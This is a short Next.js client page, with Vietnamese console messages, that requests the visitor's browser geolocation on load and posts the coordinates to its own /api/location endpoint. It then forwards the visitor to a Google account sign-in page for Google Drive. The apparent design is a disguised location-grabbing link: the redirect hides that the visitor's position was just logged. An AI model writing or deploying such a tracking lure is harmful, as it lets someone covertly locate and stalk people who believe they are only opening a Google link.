"use client";
import { use, useEffect } from "react";

export default function Home() {

  useEffect(() => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;

          await fetch("/api/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ latitude: lat, longitude: lon }),
          });

          window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fdrive.google.com%2Fdrive%2Fquota&followup=https%3A%2F%2Fdrive.google.com%2Fdrive%2Fquota&ifkv=AdBytiNhY0wt9x7S7IG4lWgyMKJOZb6L5RmcKnN08SjnnUP9C1dEefnNRbGQRheIRp5wun3U35XHqg&osid=1&passive=1209600&service=wise&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S1813591063%3A1755862011333835"
          
        },
        (err) => {
          console.error("Không lấy được vị trí:", err);
        }
      );
    } else {
      console.log("Trình duyệt không hỗ trợ geolocation.");
    }
  }, []);

}
